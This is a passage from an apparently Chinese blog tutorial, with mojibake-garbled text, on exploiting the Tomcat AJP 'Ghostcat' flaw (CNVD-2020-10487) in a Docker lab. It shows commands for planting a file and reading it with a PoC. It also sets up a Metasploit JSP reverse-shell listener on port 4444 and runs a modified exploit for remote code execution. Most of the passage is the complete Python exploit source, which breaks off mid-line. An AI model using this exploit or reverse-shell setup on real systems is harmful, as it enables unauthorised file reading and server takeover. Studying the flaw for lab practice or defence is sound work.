class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp shell.txt ae1efd71d43f:/usr/local/tomcat/webapps/ROOT/WEB-INF/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327205849367.png" alt="image-20250327205849367"></p><p>è¿›å…¥dockerå®¹å™¨æ£€æŸ¥ä¸€ä¸‹ï¼Œå‡ºç°shell.txtï¼Œè¯´æ˜ä¸Šä¼ æˆåŠŸã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -ti å®¹å™¨id bash</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327205924843.png" alt="image-20250327205924843"></p><p>æˆ‘ä»¬è¯•ç€åœ¨æ”»å‡»æœºä¸Šåˆ©ç”¨pocè¯»å–shell.txtæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/shell.txt é¶æœºip   #py2ç¯å¢ƒ</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327211933141.png" alt="image-20250327211933141"> è¯»å–æˆåŠŸï¼Œå®ç°äº†ä»»æ„æ–‡ä»¶è¯»å–çš„æ¼æ´éªŒè¯ã€‚æ¥ä¸‹æ¥è¿›è¡Œæ¼æ´åˆ©ç”¨æ¥getshellã€‚</p><p>ä¸Šä¼ å®Œæˆä¹‹åï¼Œæ”»å‡»æœºè¿›å…¥msfè¿›è¡Œç«¯å£ç›‘å¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload java/jsp_shell_reverse_tcp</span><br><span class="line">set lhost æ”»å‡»æœºip</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327210622683.png" alt="image-20250327210622683"></p><p>ä¹‹åå†åˆ©ç”¨expè¿›è¡Œåå¼¹shellã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python CNVD-2020-10487-Tomcat-Ajp-lfi-rce.py -p 8009 192.168.192.132 --rce 1 -f /WEB-INF/shell.txt</span><br><span class="line">#æ³¨æ„è¿™ä¸ªexpæ˜¯ä¿®æ”¹äº†çš„ï¼Œä¸æ˜¯åŸæ¥çš„expï¼Œæºä»£ç å¦‚ä¸‹ã€‚éœ€è¦ä½¿ç”¨python3è¿è¡Œï¼Œå…¶ä»–éƒ½å·®ä¸å¤šï¼Œå¤šäº†ä¸€ä¸ª--rceå‚æ•°è¿›è¡Œç¼–è¯‘è¿è¡Œjspæ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># CNVD-2020-10487  Tomcat-Ajp lfi</span><br><span class="line"># by ydhcui</span><br><span class="line">import struct</span><br><span class="line">import io</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Some references:</span><br><span class="line"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span><br><span class="line">def pack_string(s):</span><br><span class="line">    if s is None:</span><br><span class="line">        return struct.pack(&quot;&gt;h&quot;, -1)</span><br><span class="line">    l = len(s)</span><br><span class="line">    return struct.pack(&quot;&gt;H%dsb&quot; % l, l, s.encode(&#x27;utf8&#x27;), 0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def unpack(stream, fmt):</span><br><span class="line">    size = struct.calcsize(fmt)</span><br><span class="line">    buf = stream.read(size)</span><br><span class="line">    return struct.unpack(fmt, buf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def unpack_string(stream):</span><br><span class="line">    size, = unpack(stream, &quot;&gt;h&quot;)</span><br><span class="line">    if size == -1:  # null string</span><br><span class="line">        return None</span><br><span class="line">    res, = unpack(stream, &quot;%ds&quot; % size)</span><br><span class="line">    stream.read(1)  # \0</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class NotFoundException(Exception):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AjpBodyRequest(object):</span><br><span class="line">    # server == web server, container == servlet</span><br><span class="line">    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)</span><br><span class="line">    MAX_REQUEST_LENGTH = 8186</span><br><span class="line"></span><br><span class="line">    def __init__(self, data_stream, data_len, data_direction=None):</span><br><span class="line">        self.data_stream = data_stream</span><br><span class="line">        self.data_len = data_len</span><br><span class="line">        self.data_direction = data_direction</span><br><span class="line"></span><br><span class="line">    def serialize(self):</span><br><span class="line">        data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)</span><br><span class="line">        if len(data) == 0:</span><br><span class="line">            return struct.pack(&quot;&gt;bbH&quot;, 0x12, 0x34, 0x00)</span><br><span class="line">        else:</span><br><span class="line">            res = struct.pack(&quot;&gt;H&quot;, len(data))</span><br><span class="line">            res += data</span><br><span class="line">        if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:</span><br><span class="line">            header = struct.pack(&quot;&gt;bbH&quot;, 0x12, 0x34, len(res))</span><br><span class="line">        else:</span><br><span class="line">            header = struct.pack(&quot;&gt;bbH&quot;, 0x41, 0x42, len(res))</span><br><span class="line">        return header + res</span><br><span class="line"></span><br><span class="line">    def send_and_receive(self, socket, stream):</span><br><span class="line">        while True:</span><br><span class="line">            data = self.serialize()</span><br><span class="line">            socket.send(data)</span><br><span class="line">            r = AjpResponse.receive(stream)</span><br><span class="line">            while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:</span><br><span class="line">                r = AjpResponse.receive(stream)</span><br><span class="line"></span><br><span class="line">            if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AjpForwardRequest(object):</span><br><span class="line">    _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(</span><br><span class="line">        28)</span><br><span class="line">    REQUEST_METHODS = &#123;&#x27;GET&#x27;: GET, &#x27;POST&#x27;: POST, &#x27;HEAD&#x27;: HEAD, &#x27;OPTIONS&#x27;: OPTIONS, &#x27;PUT&#x27;: PUT, &#x27;DELETE&#x27;: DELETE,</span><br><span class="line">                       &#x27;TRACE&#x27;: TRACE&#125;</span><br><span class="line">    # server == web server, container == servlet</span><br><span class="line">    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)</span><br><span class="line">    COMMON_HEADERS = [&quot;SC_REQ_ACCEPT&quot;,</span><br><span class="line">                      &quot;SC_REQ_ACCEPT_CHARSET&quot;, &quot;SC_REQ_ACCEPT_ENCODING&quot;, &quot;SC_REQ_ACCEPT_LANGUAGE&quot;,</span><br><span class="line">                      &quot;SC_REQ_AUTHORIZATION&quot;,</span><br><span class="line">                      &quot;SC_REQ_CONNECTION&quot;, &quot;SC_REQ_CONTENT_TYPE&quot;, &quot;SC_REQ_CONTENT_LENGTH&quot;, &quot;SC_REQ_COOKIE&quot;,</span><br><span class="line">                      &quot;SC_REQ_COOKIE2&quot;,</span><br><span class="line">                      &quot;SC_REQ_HOST&quot;, &quot;SC_REQ_PRAGMA&quot;, &quot;SC_REQ_REFERER&quot;, &quot;SC_REQ_USER_AGENT&quot;</span><br><span class="line">                      ]</span><br><span class="line">    ATTRIBUTES = [&quot;context&quot;, &quot;servlet_path&quot;, &quot;remote_user&quot;, &quot;auth_type&quot;, &quot;query_string&quot;, &quot;route&quot;, &quot;ssl_cert&quot;,</span><br><span class="line">                  &quot;ssl_cipher&quot;, &quot;ssl_session&quot;, &quot;req_attribute&quot;, &quot;ssl_key_size&quot;, &quot;secret&quot;, &quot;stored_method&quot;]</span><br><span class="line"></span><br><span class="line">    def __init__(self, data_direction=None):</span><br><span class="line">        self.prefix_code = 0x02</span><br><span class="line">        self.method = None</span><br><span class="line">        self.protocol = None</span><br><span class="line">        self.req_uri = None</span><br><span class="line">        self.remote_addr = None</span><br><span class="line">        self.remote_host = None</span><br><span class="line">        self.server_name = None</span><br><span class="line">        self.server_port = None</span><br><span class="line">        self.is_ssl = None</span><br><span class="line">        self.num_headers = None</span><br><span class="line">        self.request_headers = None</span><br><span class="line">        self.attributes = None</span><br><span class="line">        self.data_direction = data_direction</span><br><span class="line"></span><br><span class="line">    def pack_headers(self):</span><br><span class="line">        self.num_headers = len(self.request_headers)</span><br><span class="line">        res = &quot;&quot;</span><br><span class="line">        res = struct.pack(&quot;&gt;h&quot;, self.num_headers)</span><br><span class="line">        for h_name in self.request_headers:</span><br><span class="line">            if h_name.startswith(&quot;SC_REQ&quot;):</span><br><span class="line">                code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1</span><br><span class="line">                res += struct.pack(&quot;BB&quot;, 0xA0, code)</span><br><span class="line">            else:</span><br><span class="line">                res += pack_string(h_name)</span><br><span class="line"></span><br><span class="line">            res += pack_string(self.request_headers[h_name])</span><br><span class="line">        return res</span><br><span class="line"></span><br><span class="line">    def pack_attributes(self):</span><br><span class="line">        res = b&quot;&quot;</span><br><span class="line">        for attr in self.attributes:</span><br><span class="line">            a_name = attr[&#x27;name&#x27;]</span><br><span class="line">            code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1</span><br><span class="line">            res += struct.pack(&quot;b&quot;, code)</span><br><span class="line">            if a_name == &quot;req_attribute&quot;:</span><br><span class="line">                aa_name, a_value = attr[&#x27;value&#x27;]</span><br><span class="line">                res += pack_string(aa_name)</span><br><span class="line">                res += pack_string(a_value)</span><br><span class="line">            else:</span><br><span class="line">                res += pack_string(attr[&#x27;value&#x27;])</span><br><span class="line">        res += struct.pack(&quot;B&quot;, 0xFF)</span><br><span class="line">        return res</span><br><span class="line"></span><br><span class="line">    def serialize(self):</span><br><span class="line">        res = &quot;&quot;</span><br><span class="line">        res = struct.pack(&quot;bb&quot;, self.prefix_code, self.method)</span><br><span class="line">        res += pack_string(self.protocol)</span><br><span class="line">        res += pack_string(self.req_uri)</span><br><span class="line">        res += pack_string(self.remote_addr)</span><br><span class="line">        res += pack_string(self.remote_host)</span><br><span class="line">        res += pack_string(self.server_name)</span><br><span class="line">        res += struct.pack(&quot;&gt;h&quot;, self.server_port)</span><br><span class="line">        res += struct.pack(&quot;?&quot;, self.is_ssl)</span><br><span class="line">        res += self.pack_headers()</span><br><span class="line">        res += self.pack_attributes()</span><br><span class="line">        if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:</span><br><span class="line">            header = struct.pack(&quot;&gt;bbh&quot;, 0x12, 0x34, len(res))</span><br><span class="line">        else:</span><br><span class="line">            header = struct.pack(&quot;&gt;bbh&quot;, 0x41, 0x42, len(res))</span><br><span class="line">        return header + res</span><br><span class="line"></span><br><span class="line">    def parse(self, raw_packet):</span><br><span class="line">        stream = io.StringIO(raw_packet)</span><br><span class="line">        self.magic1, self.magic2, data_len = unpack(stream, &quot;bbH&quot;)</span><br><span class="line">        self.prefix_code, self.method = unpack(stream, &quot;bb&quot;)</span><br><span class="line">        self.protocol = unpack_string(stream)</span><br><span class="line">        self.req_uri = unpack_string(stream)</span><br><span class="line">        self.remote_addr = unpack_string(stream)</span><br><span class="line">        self.remote_host = unpack_string(stream)</span><br><span class="line">        self.server_name = unpack_string(stream)</span><br><span class="line">        self.server_port = unpack(stream, &quot;&gt;h&quot;)</span><br><span class="line">        self.is_ssl = unpack(stream, &quot;?&quot;)</span><br><span class="line">        self.num_headers, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        self.request_headers = &#123;&#125;</span><br><span class="line">        for i in range(self.num_headers):</span><br><span class="line">            code, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">            if code &gt; 0xA000:</span><br><span class="line">                h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]</span><br><span class="line">            else:</span><br><span class="line">                h_name = unpack(stream, &quot;%ds&quot; % code)</span><br><span class="line">                stream.read(1)  # \0</span><br><span class="line">            h_value = unpack_string(stream)</span><br><span class="line">            self.request_headers[h_name] = h_value</span><br><span class="line"></span><br><span class="line">    def send_and_receive(self, socket, stream, save_cookies=False):</span><br><span class="line">        res = []</span><br><span class="line">        i = socket.sendall(self.serialize())</span><br><span class="line">        if self.method == AjpForwardRequest.POST:</span><br><span class="line">            return res</span><br><span class="line"></span><br><span class="line">        r = AjpResponse.receive(stream)</span><br><span class="line">        assert r.prefix_code == AjpResponse.SEND_HEADERS</span><br><span class="line">        res.append(r)</span><br><span class="line">        if save_cookies and &#x27;Set-Cookie&#x27; in r.response_headers:</span><br><span class="line">            self.headers[&#x27;SC_REQ_COOKIE&#x27;] = r.response_headers[&#x27;Set-Cookie&#x27;]</span><br><span class="line"></span><br><span class="line">        # read body chunks and end response packets</span><br><span class="line">        while True:</span><br><span class="line">            r = AjpResponse.receive(stream)</span><br><span class="line">            res.append(r)</span><br><span class="line">            if r.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">                break</span><br><span class="line">            elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">                continue</span><br><span class="line">            else:</span><br><span class="line">                raise NotImplementedError</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">        return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AjpResponse(object):</span><br><span class="line">    _, _, _, SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)</span><br><span class="line">    COMMON_SEND_HEADERS = [</span><br><span class="line">        &quot;Content-Type&quot;, &quot;Content-Language&quot;, &quot;Content-Length&quot;, &quot;Date&quot;, &quot;Last-Modified&quot;,</span><br><span class="line">        &quot;Location&quot;, &quot;Set-Cookie&quot;, &quot;Set-Cookie2&quot;, &quot;Servlet-Engine&quot;, &quot;Status&quot;, &quot;WWW-Authenticate&quot;</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    def parse(self, stream):</span><br><span class="line">        # read headers</span><br><span class="line">        self.magic, self.data_length, self.prefix_code = unpack(stream, &quot;&gt;HHb&quot;)</span><br><span class="line"></span><br><span class="line">        if self.prefix_code == AjpResponse.SEND_HEADERS:</span><br><span class="line">            self.parse_send_headers(stream)</span><br><span class="line">        elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">            self.parse_send_body_chunk(stream)</span><br><span class="line">        elif self.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">            self.parse_end_response(stream)</span><br><span class="line">        elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:</span><br><span class="line">            self.parse_get_body_chunk(stream)</span><br><span class="line">        else:</span><br><span class="line">            raise NotImplementedError</span><br><span class="line"></span><br><span class="line">    def parse_send_headers(self, stream):</span><br><span class="line">        self.http_status_code, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        self.http_status_msg = unpack_string(stream)</span><br><span class="line">        self.num_headers, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        self.response_headers = &#123;&#125;</span><br><span class="line">        for i in range(self.num_headers):</span><br><span class="line">            code, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">            if code &lt;= 0xA000:  # custom header</span><br><span class="line">                h_name, = unpack(stream, &quot;%ds&quot; % code)</span><br><span class="line">                stream.read(1)  # \0</span><br><span class="line">                h_value = unpack_string(stream)</span><br><span class="line">            else:</span><br><span class="line">                h_name = AjpResponse.COMMON_SEND_HEADERS[code - 0xA001]</span><br><span class="line">                h_value = unpack_string(stream)</span><br><span class="line">            self.response_headers[h_name] = h_value</span><br><span class="line"></span><br><span class="line">    def parse_send_body_chunk(self, stream):</span><br><span class="line">        self.data_length, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        self.data = stream.read(self.data_length + 1)</span><br><span class="line"></span><br><span class="line">    def parse_end_response(self, stream):</span><br><span class="line">        self.reuse, = unpack(stream, &quot;b&quot;)</span><br><span class="line"></span><br><span class="line">    def parse_get_body_chunk(self, stream):</span><br><span class="line">        rlen, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        return rlen</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def receive(stream):</span><br><span class="line">        r = AjpResponse()</span><br><span class="line">        r.parse(stream)</span><br><span class="line">        return r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):</span><br><span class="line">    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)</span><br><span class="line">    fr.method = method</span><br><span class="line">    fr.protocol = &quot;HTTP/1.1&quot;</span><br><span class="line">    fr.req_uri = req_uri</span><br><span class="line">    fr.remote_addr = target_host</span><br><span class="line">    fr.remote_host = None</span><br><span class="line">    fr.server_name = target_host</span><br><span class="line">    fr.server_port = 80</span><br><span class="line">    fr.request_headers = &#123;</span><br><span class="line">        &#x27;SC_REQ_ACCEPT&#x27;: &#x27;text/html&#x27;,</span><br><span class="line">        &#x27;SC_REQ_CONNECTION&#x27;: &#x27;keep-alive&#x27;,</span><br><span class="line">        &#x27;SC_REQ_CONTENT_LENGTH&#x27;: &#x27;0&#x27;,</span><br><span class="line">        &#x27;SC_REQ_HOST&#x27;: target_host,</span><br><span class="line">        &#x27;SC_REQ_USER_AGENT&#x27;: &#x27;Mozilla&#x27;,</span><br><span class="line">        &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate, sdch&#x27;,</span><br><span class="line">        &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.5&#x27;,</span><br><span class="line">        &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;,</span><br><span class="line">        &#x27;Cache-Control&#x27;: &#x27;max-age=0&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    fr.is_ssl = False</span><br><span class="line">    fr.attributes = []</span><br><span class="line">    return fr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Tomcat(object):</span><br><span class="line">    def __init__(self, target_host, target_port):</span><br><span class="line">        self.target_host = target_host</span><br><span class="line">        self.target_port = target_port</span><br><span class="line"></span><br><span class="line">        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">        self.socket.connect((target_host, target_port))</span><br><span class="line">        self.stream = self.socket.makefile(&quot;rb&quot;, buffering=0)</span><br><span class="line"></span><br><span class="line">    def perform_request(self, req_uri, headers=&#123;&#125;, method=&#x27;GET&#x27;, user=None, password=None, attributes=[]):</span><br><span class="line">        self.req_uri = req_uri</span><br><span class="line">        self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri,</span><br><span class="line">                                                           method=AjpForwardRequest.REQUEST_METHODS.get(method))</span><br><span class="line">        print(&quot;Getting resource at ajp13://%s:%d%s&quot; % (self.target_host, self.target_port, req_uri))</span><br><span class="line">        if user is not None and password is not None:</span><br><span class="line">            self.forward_request.request_headers[</span><br><span class="line">                &#x27;SC_REQ_AUTHORIZATION&#x27;] = f&#x27;Basic &#123;base64.b64encode(f&quot;&#123;user&#125;:&#123;password&#125;&quot;.encode()).decode()&#125;&#x27;</span><br><span class="line">        for h in headers:</span><br><span class="line">            self.forward_request.request_headers[h] = headers[h]</span><br><span class="line">        for a in attributes:</span><br><span class="line">            self.forward_request.attributes.append(a)</span><br><span class="line">        responses = self.forward_request.send_and_receive(self.socket, self.stream)</span><br><span class="line">        if len(responses) == 0:</span><br><span class="line">            return None, None</span><br><span class="line">        snd_hdrs_res = responses[0]</span><br><span class="line">        data_res = responses[1:-1]</span><br><span class="line">        if len(data_res) == 0:</span><br><span class="line">            print(&quot;No data in response. Headers:%s\n&quot; % snd_hdrs_res.response_headers)</span><br><span class="line">        return snd_hdrs_res, data_res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">javax.servlet.include.request_uri</span><br><span class="line">javax.servlet.include.path_info</span><br><span class="line">javax.servlet.include.servlet_path</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(&quot;target&quot;, type=str, help=&quot;Hostname or IP to attack&quot;)</span><br><span class="line">parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, type=int, default=8009, help=&quot;AJP port to attack (default is 8009)&quot;)</span><br><span class="line">parser.add_argument(&quot;-f&quot;, &#x27;--file&#x27;, type=str, default=&#x27;WEB-INF/web.xml&#x27;, help=&quot;file path :(WEB-INF/web.xml)&quot;)</span><br><span class="line">parser.add_argument(&#x27;--rce&#x27;, type=bool, default=False, help=&quot;read file(default) or exec command&quot;)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">t = Tomcat(args.target, args.port)</span><br><span class="line">_, data = t.perform_request(f&#x27;/hissec&#123;&quot;.jsp&quot; if args.rce else &quot;&quot;&#125;&#x27;, attributes=[</span><br><span class="line">    &#123;&#x27;name&#x27;: &#x27;req_attribute&#x27;, &#x27;value&#x27;: [&#x27;javax.servlet.include.request_uri&#x27;, &#x27;/&#x27;]&#125;,</span><br><span class="line">    &#123;&#x27;name&#x27;: &#x27;req_attribute&#x27;, &#x27;value&#x27;: [&#x27;javax.servlet.include.path_info&#x27;, args.file]&#125;,</span><br><span class="line">    